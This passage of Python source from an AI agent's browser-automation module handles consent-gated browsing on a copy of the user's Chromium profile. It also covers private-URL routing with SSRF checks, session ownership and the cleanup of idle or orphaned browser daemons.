    except Exception:
        return False


def _agent_browser_get_cdp(session_name: str) -> Optional[str]:
    """Return the HTTP CDP endpoint of an agent-browser session, or None.

    agent-browser prints ``ws://127.0.0.1:<port>/devtools/browser/<id>`` for
    ``get cdp-url``; the browser-use harness wants the HTTP discovery root
    (``http://127.0.0.1:<port>``), so we convert. None when the session isn't
    running or the port can't be parsed.
    """
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return None
    try:
        proc = subprocess.run(
            [*_agent_browser_argv(browser_cmd), "--session", session_name, "get", "cdp-url"],
            capture_output=True, text=True, timeout=15, env=_build_browser_env(),
        )
    except (subprocess.SubprocessError, OSError) as e:
        logger.debug("real-profile get cdp-url failed: %s", e)
        return None
    out = (proc.stdout or "").strip()
    m = re.search(r"ws://127\.0\.0\.1:(\d+)/", out)
    if not m:
        return None
    return f"http://127.0.0.1:{m.group(1)}"


def _cdp_on_data_dir(http_cdp: str, data_dir: str) -> bool:
    """True when the CDP endpoint's browser is running on ``data_dir``.

    agent-browser's launched Chrome writes ``DevToolsActivePort`` into its
    user-data-dir with the live debug port on the first line. Matching that
    port against the CDP endpoint's port confirms the running browser is our
    profile copy — not a throwaway temp dir a raced/stale launch fell back to.
    """
    m = re.search(r":(\d+)", http_cdp or "")
    if not m:
        return False
    try:
        with open(os.path.join(data_dir, "DevToolsActivePort"), encoding="utf-8") as fh:
            port_line = fh.readline().strip()
        return port_line == m.group(1)
    except OSError:
        return False


def _agent_browser_close_session(session_name: str) -> None:
    """Best-effort close of an agent-browser session (stale/wrong-dir cleanup)."""
    try:
        browser_cmd = _find_agent_browser()
    except FileNotFoundError:
        return
    try:
        subprocess.run(
            [*_agent_browser_argv(browser_cmd), "--session", session_name, "close"],
            capture_output=True, text=True, timeout=15, env=_build_browser_env(),
        )
    except (subprocess.SubprocessError, OSError) as e:
        logger.debug("real-profile session close failed: %s", e)


def _real_profile_cdp() -> tuple:
    """Resolve ``(cdp_url, error)`` for consented real-profile browsing.

    Snapshots the user's default-Chromium profile into a hermes-owned copy
    (auth/login state only), then has agent-browser launch its packaged
    Chromium on that copy and returns the HTTP CDP endpoint for the browser-use
    harness to attach to. The copy is a non-default dir, so it sidesteps the
    Chrome ≥136 default-profile remote-debugging block and never contends with
    the user's running browser; agent-browser launches the packaged Chromium
    with no mock-keychain switches, so keyring-encrypted cookies decrypt.

    A single shared agent-browser session is reused across calls (its CDP URL
    is cached and re-validated). Returns ``(None, message)`` fail-closed when
    the default browser is non-Chromium or the snapshot/launch fails;
    ``(None, None)`` when consent is off.
    """
    if not _use_real_profile():
        # Consent is off. If a snapshot store from a previous consented run is
        # still on disk, it holds copies of the user's cookies/logins — delete
        # it so revoking consent actually removes the credential copies. Cheap
        # (one isdir check) and idempotent.
        try:
            from hermes_cli.browser_connect import cleanup_real_profile_snapshots

            cleanup_real_profile_snapshots()
        except Exception as e:
            logger.debug("real-profile cleanup-on-consent-off failed: %s", e)
        _real_profile_cdp_cache.pop("cdp", None)
        return None, None

    # Lightpanda cannot load a Chromium profile — agent-browser rejects
    # ``--profile`` outright under that engine ("Profiles are not supported
    # with Lightpanda"). Detect it here, BEFORE default-browser detection, so
    # even a host with no Chromium default reports the actionable conflict (the
    # engine setting) rather than a generic launch failure.
    if _using_lightpanda_engine():
        return None, (
            "browser.use_real_profile is on, but browser.engine is set to "
            "'lightpanda', which cannot load a real Chromium profile. Set "
            "browser.engine to 'auto' or 'chrome' to use real-profile browsing, "
            "or turn the toggle off."
        )

    from hermes_cli.browser_connect import (
        UNSUPPORTED_CHANNEL,
        detect_default_chromium,
        real_profile_copy_dir,
        snapshot_real_profile,
    )

    with _real_profile_cdp_lock:
        # Reuse a live copy-browser from an earlier call this process made.
        cached = _real_profile_cdp_cache.get("cdp")
        if cached and _cdp_http_ready(cached):
            return cached, None
        _real_profile_cdp_cache.pop("cdp", None)

        browser = detect_default_chromium()
        if browser is None:
            return None, (
                "browser.use_real_profile is on, but your default browser is not a "
                "supported Chromium browser (Chrome, Edge, Brave, Brave Origin, "
                "Chromium). "
                "Real-profile browsing requires a Chromium default; set one or turn "
                "the toggle off."
            )
        if browser == UNSUPPORTED_CHANNEL:
            # A recognized pre-release channel (Beta/Dev/Canary) is the OS
            # default. Its profile lives in a channel-specific directory we
            # don't resolve, and normalizing it to the stable family would
            # drive a DIFFERENT profile/account — a wrong-principal bug. Fail
            # closed rather than guess (#95549 invariant).
            return None, (
                "browser.use_real_profile is on, but your default browser is a "
                "pre-release Chromium channel (Beta / Dev / Canary), which "
                "real-profile browsing does not support. Set your default to a "
                "stable Chrome / Edge / Brave / Brave Origin / Chromium, or turn "
                "the toggle off."
            )

        # Reuse BEFORE writing anything. A shared copy-browser may already be up
        # from a previous hermes process; if it is driving OUR copy dir, hand it
        # back untouched. CRITICAL: the snapshot overlay (which truncates and
        # rewrites Cookies / Login Data) must NOT run while that browser holds
        # the user-data-dir open — doing so corrupts the live databases (torn
        # reads, locked transactions, phantom logouts). So resolve the copy dir
        # as a PATH only (no copy), probe reuse, and return early on a hit. The
        # snapshot/overlay happens solely on the relaunch path below, when no
        # live browser owns the dir.
        copy_dir = real_profile_copy_dir(browser)
        existing = _agent_browser_get_cdp(_REAL_PROFILE_SESSION)
        if existing and _cdp_http_ready(existing) and _cdp_on_data_dir(existing, copy_dir):
            _real_profile_cdp_cache["cdp"] = existing
            return existing, None
        if existing:
            # Stale/wrong-dir session (throwaway-temp fallback, or an old copy):
            # close it so nothing holds the dir open before we overlay + relaunch.
            _agent_browser_close_session(_REAL_PROFILE_SESSION)

        # No live browser owns the dir now — safe to (re)snapshot + overlay.
        snap_dir, err = snapshot_real_profile(browser)
        if err or not snap_dir:
            from hermes_cli.browser_connect import _PROFILE_LOCKED_PREFIX

            if err and err.startswith(_PROFILE_LOCKED_PREFIX):
                # The user's browser is holding the profile. Surface the guidance
                # verbatim (it already tells the agent whether closing is armed)
                # plus the exact approved-close command. The agent must ASK the
                # user before running it — it quits their browser.
                body = err[len(_PROFILE_LOCKED_PREFIX):]
                return None, (
                    body + " To close it (only after the user approves — it "
                    "quits their browser and loses unsaved tabs), run: "
                    "`hermes browser close-profile`, then retry."
                )
            return None, f"browser.use_real_profile is on, but {err}"
        copy_dir = snap_dir

        # Launch the user's REAL browser binary directly on the profile COPY.
        # agent-browser 0.35's own
        # launch path force-adds --use-mock-keychain/--password-store=basic
        # (and --headless=new), which makes macOS Chrome treat every
        # keychain-encrypted cookie as undecryptable and drop it — the copied
        # profile launches signed out. Launching the real binary ourselves with
        # NO mock-keychain switches keeps the OS keychain path intact, exactly
        # as the snapshot design intends; agent-browser attaches to it after
        # via --auto-connect (--cdp <port>).
        from hermes_cli.browser_connect import chromium_executable

        real_binary = chromium_executable(browser)
        if real_binary is None:
            return None, (
                "browser.use_real_profile is on, but the real browser binary for "
                f"'{browser}' could not be found. Reinstall it or turn the toggle off."
            )

        port_file = os.path.join(copy_dir, "DevToolsActivePort")
        try:
            os.unlink(port_file)  # stale port from a previous launch confuses reuse probes
        except OSError:
            pass
        chrome_argv = [
            real_binary,
            f"--user-data-dir={copy_dir}",
            "--remote-debugging-port=0",
            "--no-first-run",
            "--no-default-browser-check",
            "--disable-background-networking",
            "--disable-component-update",
            "--disable-default-apps",
            "--disable-hang-monitor",
            "--disable-popup-blocking",
            "--disable-prompt-on-repost",
            "--disable-sync",
            "--disable-features=Translate",
            "--no-startup-window",
        ]
        # Drive the copy headlessly by default. Real-profile browsing is a
        # background capability — the agent tweets / fills forms / scrapes on
        # the user's behalf while they keep working; a visible window that
        # steals focus every turn defeats the point. Chrome's NEW headless mode
        # shares the profile's normal cookie store (unlike legacy --headless
        # with its separate store), so the copied auth/login state still loads.
        # Cookie decryption is unaffected by headless: the drop we guard against
        # comes from --use-mock-keychain (which agent-browser's own launcher
        # force-adds and we deliberately avoid), NOT from headless mode. This
        # also covers display-less Linux (servers, CI), where a headed launch
        # would exit at startup. Users who want to watch can opt in via the same
        # browser.headed / AGENT_BROWSER_HEADED toggle the rest of the browser
        # stack honors; on a display-less host we force headless regardless so
        # the launch doesn't die.
        _has_display = bool(
            os.environ.get("DISPLAY") or os.environ.get("WAYLAND_DISPLAY")
        )
        _want_headed = _is_headed_mode() and (
            _has_display or not sys.platform.startswith("linux")
        )
        if not _want_headed:
            chrome_argv.append("--headless=new")
        try:
            chrome_proc = subprocess.Popen(
                chrome_argv,
                stdout=subprocess.DEVNULL,
                stderr=subprocess.DEVNULL,
                stdin=subprocess.DEVNULL,
                start_new_session=True,
                env=_build_browser_env(),
            )
        except (subprocess.SubprocessError, OSError) as e:
            return None, f"browser.use_real_profile is on, but the launch failed: {e}"
        _real_profile_chrome_procs.append(chrome_proc)

        # Wait for DevToolsActivePort to appear (Chrome picks a free port).
        import time as _time

        deadline = _time.monotonic() + 30.0
        port = None
        while _time.monotonic() < deadline:
            try:
                with open(port_file, encoding="utf-8") as fh:
                    line = fh.readline().strip()
                if line.isdigit():
                    port = int(line)
                    break
            except OSError:
                pass
            if chrome_proc.poll() is not None:
                _terminate_real_profile_chrome()
                return None, (
                    "browser.use_real_profile is on, but Chrome exited during "
                    "startup (another instance may hold the profile copy)."
                )
            _time.sleep(0.25)
        if port is None:
            _terminate_real_profile_chrome()
            return None, (
                "browser.use_real_profile is on, but the real-profile browser "
                "did not expose a debug port in time. Retry, or turn the toggle off."
            )

        # Tell agent-browser to ATTACH to the running Chrome instead of
        # launching its own (its own launch injects mock-keychain flags).
        try:
            browser_cmd = _find_agent_browser()
        except FileNotFoundError as e:
            return None, (
                "browser.use_real_profile is on, but the local browser engine "
                f"(agent-browser) is not installed: {e}"
            )
        argv = [
            *_agent_browser_argv(browser_cmd),
            "--session", _REAL_PROFILE_SESSION,
            "--cdp", str(port),
            "open", "about:blank",
        ]
        try:
            proc = subprocess.run(
                argv, capture_output=True, text=True,
                timeout=_get_open_command_timeout(first_open=True),
                env=_build_browser_env(),
            )
        except subprocess.TimeoutExpired:
            return None, (
                "browser.use_real_profile is on, but the real-profile browser "
                "took too long to start. Retry, or turn the toggle off."
            )
        except (subprocess.SubprocessError, OSError) as e:
            return None, f"browser.use_real_profile is on, but the launch failed: {e}"
        if proc.returncode != 0:
            tail = (proc.stderr or proc.stdout or "").strip().splitlines()
            reason = tail[-1] if tail else f"exit {proc.returncode}"
            return None, (
                f"browser.use_real_profile is on, but the real-profile browser "
                f"failed to start: {reason}"
            )

        cdp = _agent_browser_get_cdp(_REAL_PROFILE_SESSION)
        # The daemon may answer with the endpoint of a
        # browser IT spawned (throwaway temp profile) instead of the real
        # Chrome we launched on the copy. The DevToolsActivePort file OUR
        # Chrome wrote is the authoritative endpoint of the logged-in browser;
        # if the daemon disagrees, trust ours.
        try:
            with open(port_file, encoding="utf-8") as fh:
                our_port = fh.readline().strip()
            m = re.search(r":(\d+)", cdp or "")
            if m and m.group(1) != our_port:
                cdp = f"http://127.0.0.1:{our_port}"
        except (OSError, ValueError):
            pass
        if not cdp:
            return None, (
                "browser.use_real_profile is on, but the real-profile browser "
                "started without exposing a devtools endpoint. Retry, or turn "
                "the toggle off."
            )
        _real_profile_cdp_cache["cdp"] = cdp
        logger.info("real-profile browser ready for %s at %s (%s)", browser, cdp, copy_dir)
        return cdp, None


def _url_is_private(url: str) -> bool:
    """Return True when the URL's host resolves to a private/LAN/loopback address.

    Reuses ``tools.url_safety.is_safe_url`` as the oracle — if the SSRF check
    would reject the URL, we treat it as "private" for routing purposes.  DNS
    resolution failures are treated as NOT private (fall through to whatever
    backend is configured, which will surface the DNS error naturally).
    """
    try:
        # is_safe_url returns False for private/loopback/link-local/CGNAT AND
        # for DNS failures.  We only want the private-network case here, so
        # we parse + check the host shape as a DNS-failure sieve first.
        from urllib.parse import urlparse
        import ipaddress
        import socket
        parsed = urlparse(url)
        hostname = (parsed.hostname or "").strip().lower().rstrip(".")
        if not hostname:
            return False
        # Literal IP → check directly
        try:
            ip = ipaddress.ip_address(hostname)
            return (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                # 172.16.0.0/12: only covered by ip.is_private on Python
                # ≥3.11 (bpo-40791).  Explicit check keeps 3.10 runtimes
                # routing these to the local sidecar correctly.
                or ip in ipaddress.ip_network("172.16.0.0/12")
                or ip in ipaddress.ip_network("100.64.0.0/10")
            )
        except ValueError:
            pass
        # Hostname — must resolve to confirm it's private (bare "localhost"
        # resolves to 127.0.0.1 via /etc/hosts).  Short-circuit on obvious
        # names to avoid a DNS hop.
        if hostname in {"localhost",} or hostname.endswith(".localhost"):
            return True
        if hostname.endswith(".local") or hostname.endswith(".lan") or hostname.endswith(".internal"):
            return True
        try:
            addr_info = socket.getaddrinfo(hostname, None, socket.AF_UNSPEC, socket.SOCK_STREAM)
        except socket.gaierror:
            return False  # DNS fail → not private, let the normal path fail
        for _, _, _, _, sockaddr in addr_info:
            try:
                ip = ipaddress.ip_address(sockaddr[0])
            except ValueError:
                continue
            if (
                ip.is_private
                or ip.is_loopback
                or ip.is_link_local
                or ip in ipaddress.ip_network("100.64.0.0/10")
            ):
                return True
        return False
    except Exception as exc:
        logger.debug("URL-privacy check failed for %s: %s", url, exc)
        return False


def _navigation_session_key(task_id: str, url: str) -> str:
    """Pick the session key that should handle ``url`` for ``task_id``.

    Returns the bare task_id unless ALL of these are true:
      1. A cloud provider is configured (``_get_cloud_provider()`` is not None).
      2. Auto-local routing is enabled (``browser.auto_local_for_private_urls``,
         default True).
      3. The URL resolves to a private/LAN/loopback address.
      4. A CDP override is not active (that path owns the whole session).
      5. Camofox mode is not active (Camofox is already local-only).

    When all are true, returns ``f"{task_id}::local"`` so the hybrid-routing
    path spawns a local Chromium sidecar while the cloud session (if any)
    continues to serve public URLs. With ``browser.use_real_profile`` consent,
    local sessions (bare or sidecar) attach to the user's real-profile
    copy-browser via ``_create_local_session``; forcing a local session from
    the model side is the Browser Use lane's ``local`` argument, not a
    built-in-tools argument.
    """
    if task_id is None:
        task_id = "default"
    if _get_cdp_override_raw():
        return task_id
    if _is_camofox_mode():
        return task_id
    if _get_cloud_provider() is None:
        return task_id
    if not _auto_local_for_private_urls():
        return task_id
    if not _url_is_private(url):
        return task_id
    return f"{task_id}{_LOCAL_SUFFIX}"


def _is_local_sidecar_key(session_key: str) -> bool:
    """Return True when ``session_key`` is a hybrid-routing local sidecar."""
    return session_key.endswith(_LOCAL_SUFFIX)


def _bare_task_id_for_session_key(session_key: str) -> str:
    """Return the owning bare task id for an opaque browser session key."""
    if _is_local_sidecar_key(session_key):
        return session_key[: -len(_LOCAL_SUFFIX)]
    return session_key


def _session_info_owned_by_task(session_info: Dict[str, Any], task_id: str, session_key: str) -> bool:
    """Return whether ``session_info`` still belongs to ``task_id``/``session_key``.

    Sessions created by current code carry explicit ownership metadata. Treat
    older in-memory entries without those fields as valid for hot-reload/test
    compatibility, but reject any explicit mismatch before a non-navigation
    tool can act on the wrong tab/session.
    """
    owner = session_info.get("owner_task_id")
    key = session_info.get("session_key")
    if owner is not None and owner != task_id:
        return False
    if key is not None and key != session_key:
        return False
    return True


def _last_session_key(task_id: str) -> str:
    """Return the live session key to use for a non-nav browser tool call.

    ``browser_navigate`` records which concrete session key served a task's
    most recent successful navigation. Non-navigation tools must reuse that key
    so click/fill/snapshot land in the same browser. If the recorded owner was
    later cleaned up or ownership metadata no longer matches, fail closed by
    dropping the stale binding instead of silently recreating or mutating the
    wrong browser.
    """
    if task_id is None:
        task_id = "default"
    recorded_key = _last_active_session_key.get(task_id)
    if not recorded_key:
        return task_id
    with _cleanup_lock:
        session_info = _active_sessions.get(recorded_key)
        if session_info and _session_info_owned_by_task(session_info, task_id, recorded_key):
            return recorded_key
        _last_active_session_key.pop(task_id, None)
    logger.debug(
        "browser session ownership: dropping stale/mismatched last-active binding %s -> %s",
        task_id,
        recorded_key,
    )
    return task_id


def _allow_private_urls() -> bool:
    """Return whether the browser is allowed to navigate to private/internal addresses.

    Reads ``config["browser"]["allow_private_urls"]``. Single-profile calls
    cache the result for the process lifetime; multiplexed profile turns resolve
    their context-local config on each call. Defaults to ``False`` (SSRF
    protection active).
    """
    global _cached_allow_private_urls, _allow_private_urls_resolved

    # The profile multiplexer scopes config with a ContextVar while sharing
    # this module. Never reuse another profile's private-network opt-out.
    if get_hermes_home_override() is not None:
        return _resolve_allow_private_urls()

    if _allow_private_urls_resolved:
        return _cached_allow_private_urls

    _allow_private_urls_resolved = True
    _cached_allow_private_urls = _resolve_allow_private_urls()
    return _cached_allow_private_urls


def _resolve_allow_private_urls() -> bool:
    """Read the browser private-URL toggle from the active config scope."""
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        browser_cfg = cfg.get("browser", {})
        if isinstance(browser_cfg, dict):
            return is_truthy_value(
                browser_cfg.get("allow_private_urls"), default=False
            )
    except Exception as e:
        logger.debug("Could not read allow_private_urls from config: %s", e)
    return False


def _socket_safe_tmpdir() -> str:
    """Return a short temp directory path suitable for Unix domain sockets.

    macOS sets ``TMPDIR`` to ``/var/folders/xx/.../T/`` (~51 chars).  When we
    append ``agent-browser-hermes_…`` the resulting socket path exceeds the
    104-byte macOS limit for ``AF_UNIX`` addresses, causing agent-browser to
    fail with "Failed to create socket directory" or silent screenshot failures.

    Linux ``tempfile.gettempdir()`` already returns ``/tmp``, so this is a
    no-op there.  On macOS we bypass ``TMPDIR`` and use ``/tmp`` directly
    (symlink to ``/private/tmp``, sticky-bit protected, always available).
    """
    if sys.platform == "darwin":
        return "/tmp"
    return tempfile.gettempdir()


# Track active sessions per "session key".
#
# A "session key" is either the bare task_id (cloud/default path) OR a composite
# like f"{task_id}::local" when the hybrid-routing feature spawns a local sidecar
# browser for a LAN/localhost URL while a cloud provider is configured globally.
# Both forms flow through the same _active_sessions / _run_browser_command /
# cleanup_browser code paths — the key is opaque to those internals.
#
# Stores: session_name (always), bb_session_id + cdp_url (cloud mode only)
_active_sessions: Dict[str, Dict[str, Any]] = {}  # session_key -> {session_name, ...}
_recording_sessions: set = set()  # session_keys with active recordings

# Tracks the most recent session_key used per task_id. Set by browser_navigate()
# after it chooses a backend for a URL; read by every non-nav browser tool
# (snapshot/click/fill/eval/...) so they target the session that served the last
# navigation.  Without this, a task that navigated to localhost on the local
# sidecar would fall back to the cloud session on its next snapshot call.
_last_active_session_key: Dict[str, str] = {}  # task_id -> session_key
_LOCAL_SUFFIX = "::local"

# Flag to track if cleanup has been done
_cleanup_done = False

# =============================================================================
# Inactivity Timeout Configuration
# =============================================================================

# Session inactivity timeout (seconds) - cleanup if no activity for this long.
# config.yaml is authoritative; BROWSER_INACTIVITY_TIMEOUT remains a legacy
# fallback so old deployments keep working if they have not migrated yet.
DEFAULT_SESSION_INACTIVITY_TIMEOUT = int(
    DEFAULT_CONFIG.get("browser", {}).get("inactivity_timeout", 120)
)


def _get_session_inactivity_timeout() -> int:
    result = env_int("BROWSER_INACTIVITY_TIMEOUT", DEFAULT_SESSION_INACTIVITY_TIMEOUT)
    try:
        from hermes_cli.config import read_raw_config
        cfg = read_raw_config()
        val = cfg_get(cfg, "browser", "inactivity_timeout")
        if val is not None:
            result = max(int(val), 30)  # Floor at 30s to avoid instant reaping
    except Exception as e:
        logger.debug("Could not read inactivity_timeout from config: %s", e)
    return result


BROWSER_SESSION_INACTIVITY_TIMEOUT = _get_session_inactivity_timeout()

# How often the cleanup thread re-runs the orphan reaper.  The reaper used to
# run exactly once, before the cleanup loop started, which meant a hermes
# process that stays up for days could never recover from a leak that appeared
# *after* boot.  Observed in the wild: five agent-browser daemons accumulated
# over 10 days in a single 18-day-uptime process, pinning ~5 CPU cores.
BROWSER_ORPHAN_REAP_INTERVAL = 300  # seconds

# Hard ceiling for a daemon whose owning hermes process is still alive but
# which has fallen out of that process's in-memory session tracking.  The
# owner-alive check alone makes such a daemon immortal: in-memory tracking is
# lost on any exception path, yet the owner PID stays up, so the reaper skips
# it forever.  Idle age (see ``_socket_dir_idle_seconds``) is the escape hatch.
# Deliberately a large multiple of the inactivity timeout so a legitimately
# busy session is never touched.
BROWSER_ORPHAN_GRACE_SECONDS = max(3600, BROWSER_SESSION_INACTIVITY_TIMEOUT * 20)

# Track last activity time per session
_session_last_activity: Dict[str, float] = {}
# Owner Hermes home per session (#86402).  The inactivity janitor is one
# process-global thread started by whichever profile first opens a browser,
# so it has no profile scope of its own; under multiplexing every cleanup
# must re-enter the *owning* profile's scope (copy_context at spawn would pin
# the first profile's secrets onto every other profile's teardown).
_session_owner_homes: Dict[str, str] = {}
# Consecutive janitor cleanup failures per session; after
# MAX_INACTIVITY_CLEANUP_FAILURES the session is force-reaped (#100738).
_cleanup_failures: Dict[str, int] = {}
MAX_INACTIVITY_CLEANUP_FAILURES = 3

# Session keys flagged suspect after a command timeout (#72205 / #85125 3b).
# Written by _BrowserSessionBackend.mark_suspect (cheap, lock-free — a single
# GIL-atomic dict write per the agent.deadline.SuspectableBackend contract);
# consumed by ensure_healthy() at next use, which recycles the session.
_suspect_browser_sessions: Dict[str, str] = {}


class _BrowserSessionBackend:
    """``agent.deadline.SuspectableBackend`` adapter for one cached session key.

    The browser "backend" is the module-level ``_active_sessions[key]`` cache
    entry plus its agent-browser daemon, so the adapter is a thin stateless
    view keyed by session key rather than a long-lived object.  Browser
    commands run through raw ``subprocess`` waits (not ``run_bounded_*``), so
    the timeout path calls ``mark_suspect`` inline; ``ensure_healthy`` runs at
    the top of ``_get_session_info`` — the single choke point every browser
    command passes through before reusing a cached session.
    """

    __slots__ = ("_session_key",)

    def __init__(self, session_key: str) -> None:
        self._session_key = session_key

    def mark_suspect(self, reason: str) -> None:
        """Flag the cached session as possibly poisoned.

        MUST stay cheap, non-blocking, and lock-free (SuspectableBackend
        adopter contract): it runs inline on the timed-out caller's thread.
        All expensive recycle work is deferred to ``ensure_healthy``.
        """
        _suspect_browser_sessions[self._session_key] = reason

    def ensure_healthy(self) -> bool:
        """Recycle the session when a prior timeout marked it suspect.

        Returns ``True`` when the cached session is safe to reuse, ``False``
        after tearing down a suspect session (caller creates a fresh one).
        The flag is popped *before* teardown: ``_cleanup_single_browser_session``
        issues an agent-browser ``close`` through ``_run_browser_command`` /
        ``_get_session_info``, and clearing first keeps that re-entrant call
        from recursing back into another recycle.
        """
        reason = _suspect_browser_sessions.pop(self._session_key, None)
        if reason is None:
            return True
        logger.info(
            "Recycling suspect browser session %s before reuse (%s)",
            self._session_key, reason,
        )
        try:
            _cleanup_single_browser_session(self._session_key)
        except Exception:
            logger.warning(
                "Teardown of suspect browser session %s failed; a fresh "
                "session will be created anyway", self._session_key,
                exc_info=True,
            )
        return False


def _browser_session_backend(session_key: str) -> _BrowserSessionBackend:
    """Return the SuspectableBackend adapter for ``session_key``."""
    return _BrowserSessionBackend(session_key)

# Background cleanup thread state
_cleanup_thread = None
_cleanup_running = False
# Protects _session_last_activity AND _active_sessions for thread safety
# (subagents run concurrently via ThreadPoolExecutor)
_cleanup_lock = threading.Lock()


def _session_expiry_timestamp(session_info: Dict[str, Any]) -> Optional[float]:
    """Return a provider-authoritative session expiry as epoch seconds.

    Cloud providers may omit ``expires_at``. Unknown or malformed values are
    therefore treated as having no known expiry, preserving the existing
    lifecycle for local browsers and providers without an expiry contract.
    """
    value = session_info.get("expires_at")
    if isinstance(value, (int, float)) and not isinstance(value, bool):
        return float(value)
    if not isinstance(value, str) or not value.strip():
        return None

    normalized = value.strip()
    if normalized.endswith(("Z", "z")):
        normalized = f"{normalized[:-1]}+00:00"
    try:
        parsed = datetime.fromisoformat(normalized)
    except ValueError:
        logger.warning("Ignoring invalid cloud browser session expiry timestamp")
        return None
    if parsed.tzinfo is None:
        parsed = parsed.replace(tzinfo=timezone.utc)
    return parsed.timestamp()


def _session_has_expired(
    session_info: Dict[str, Any], *, now: Optional[float] = None
) -> bool:
    """Return whether a cached browser session crossed its provider deadline."""
    expires_at = _session_expiry_timestamp(session_info)
    if expires_at is None:
        return False
    return (time.time() if now is None else now) >= expires_at


def _emergency_cleanup_all_sessions():
    """
    Emergency cleanup of all active browser sessions.
    Called on process exit or interrupt to prevent orphaned sessions.

    Also runs the orphan reaper to clean up daemons left behind by previously
    crashed hermes processes — this way every clean hermes exit sweeps
    accumulated orphans, not just ones that actively used the browser tool.
    """
    global _cleanup_done
    if _cleanup_done:
        return
    _cleanup_done = True

    # Clean up this process's own sessions first, so their owner_pid files
    # are removed before the reaper scans.
    # Real-profile Chrome processes are launched directly (not by
    # agent-browser), so the session cleanup below never reaps them.
    try:
        _terminate_real_profile_chrome()
    except Exception as e:
        logger.debug("Real-profile chrome cleanup on exit failed: %s", e)
    if _active_sessions:
        logger.info("Emergency cleanup: closing %s active session(s)...",
                    len(_active_sessions))
        try:
            cleanup_all_browsers()
        except Exception as e:
            logger.error("Emergency cleanup error: %s", e)
        finally:
            with _cleanup_lock:
                _active_sessions.clear()
                _session_last_activity.clear()
                _session_owner_homes.clear()
                _cleanup_failures.clear()
                _recording_sessions.clear()

    # Lightpanda servers (Browser Use mode) are processes we spawned; the
    # session cleanup above stops the tracked ones, this catches any that
    # fell out of ``_active_sessions``.
    try:
        from tools.browser_lightpanda import stop_all_lightpanda

        stop_all_lightpanda()
    except Exception as e:
        logger.debug("Lightpanda cleanup on exit failed: %s", e)

    # Sweep orphans from other crashed hermes processes.  Safe even if we
    # never used the browser — uses owner_pid liveness to avoid reaping
    # daemons owned by other live hermes processes.
    try:
        _reap_orphaned_browser_sessions()
    except Exception as e:
        logger.debug("Orphan reap on exit failed: %s", e)


# Register cleanup via atexit only.  Previous versions installed SIGINT/SIGTERM
# handlers that called sys.exit(), but this conflicts with prompt_toolkit's
# async event loop — a SystemExit raised inside a key-binding callback
# corrupts the coroutine state and makes the process unkillable.  atexit
# handlers run on any normal exit (including sys.exit), so browser sessions
# are still cleaned up without hijacking signals.
atexit.register(_emergency_cleanup_all_sessions)


# =============================================================================
# Inactivity Cleanup Functions
# =============================================================================

@contextlib.contextmanager
def _session_owner_scope(task_id: str):
    """Run under the Hermes home + secret scope that owns ``task_id``'s
    browser session (recorded by ``_update_session_activity``).

    No-op when no owner was recorded.  Mirrors
    ``gateway.run._profile_runtime_scope`` — the janitor thread is
    process-global, so each session's teardown must re-enter its OWN
    profile's scope rather than inherit whichever profile spawned the
    thread; never falls through to ``os.environ``.
    """
    owner_home = _session_owner_homes.get(task_id)
    if owner_home is None:
        yield
        return

    from agent.secret_scope import (
        build_profile_secret_scope,
        reset_secret_scope,
        set_secret_scope,
    )
    from hermes_cli.env_loader import hydrate_profile_secret_sources

    home_token = set_hermes_home_override(owner_home)
    try:
        hydrate_profile_secret_sources(Path(owner_home))
        secret_token = set_secret_scope(build_profile_secret_scope(Path(owner_home)))
        try:
            yield
        finally:
            reset_secret_scope(secret_token)
    finally:
        reset_hermes_home_override(home_token)


def _cleanup_inactive_browser_sessions():
    """
    Clean up browser sessions that have been inactive for longer than the timeout.

    This function is called periodically by the background cleanup thread to
    automatically close sessions that haven't been used recently, preventing
    orphaned sessions (local or Browserbase) from accumulating.

    Each session is torn down under its owner profile's scope (#86402).  A
    session whose cleanup keeps failing is force-reaped after
    ``MAX_INACTIVITY_CLEANUP_FAILURES`` attempts instead of retrying forever
    (#100738); only a successful cleanup clears its failure count.
    """
    current_time = time.time()
    sessions_to_cleanup = []

    with _cleanup_lock:
        for task_id, last_time in list(_session_last_activity.items()):
            if current_time - last_time > BROWSER_SESSION_INACTIVITY_TIMEOUT:
                sessions_to_cleanup.append(task_id)

    for task_id in sessions_to_cleanup:
        elapsed = int(current_time - _session_last_activity.get(task_id, current_time))
        logger.info("Cleaning up inactive session for task: %s (inactive for %ss)", task_id, elapsed)
        try:
            with _session_owner_scope(task_id):
                cleanup_browser(task_id)
            with _cleanup_lock:
                _session_last_activity.pop(task_id, None)
                _session_owner_homes.pop(task_id, None)
                _cleanup_failures.pop(task_id, None)
        except Exception as e:
            with _cleanup_lock:
                failures = _cleanup_failures[task_id] = _cleanup_failures.get(task_id, 0) + 1
            if failures < MAX_INACTIVITY_CLEANUP_FAILURES:
                logger.warning("Error cleaning up inactive session %s (attempt %d/%d): %s",
                               task_id, failures, MAX_INACTIVITY_CLEANUP_FAILURES, e)
                continue
            logger.error("Browser cleanup failed %d times for inactive session %s; "
                         "force-reaping: %s", failures, task_id, e)
            try:
                with _session_owner_scope(task_id):
                    _force_reap_browser_session(task_id)
            except Exception as reap_exc:
                logger.error("Force-reap of browser session %s failed: %s", task_id, reap_exc)
            finally:
                with _cleanup_lock:
                    _session_owner_homes.pop(task_id, None)
                    _cleanup_failures.pop(task_id, None)

    # The managed browser outlives Hermes sessions by design, so it needs its
    # own idle policy - closing a session no longer closes a window.
    _maybe_close_idle_managed_browser()


def _write_owner_pid(socket_dir: str, session_name: str) -> None:
    """Record the current hermes PID as the owner of a browser socket dir.

    Written atomically to ``<socket_dir>/<session_name>.owner_pid`` so the
    orphan reaper can distinguish daemons owned by a live hermes process
    (don't reap) from daemons whose owner crashed (reap).  Best-effort —
    an OSError here just falls back to the legacy ``tracked_names``
    heuristic in the reaper.
    """
    try:
        path = os.path.join(socket_dir, f"{session_name}.owner_pid")
        with open(path, "w", encoding="utf-8") as f:
            f.write(str(os.getpid()))
    except OSError as exc:
        logger.debug("Could not write owner_pid file for %s: %s",
                     session_name, exc)


def _verify_reapable_browser_daemon(daemon_pid: int, socket_dir: str,
                                    session_name: str) -> bool:
    """Confirm a live PID is genuinely *this* session's agent-browser daemon.

    The orphan reaper scans world-writable, predictably-named temp paths
    (``/tmp/agent-browser-h_*`` etc.) and reads a daemon PID from a ``.pid``
    file we do not write ourselves — the agent-browser daemon writes it.  A
    same-user actor can therefore plant a fake socket dir whose ``.pid`` points
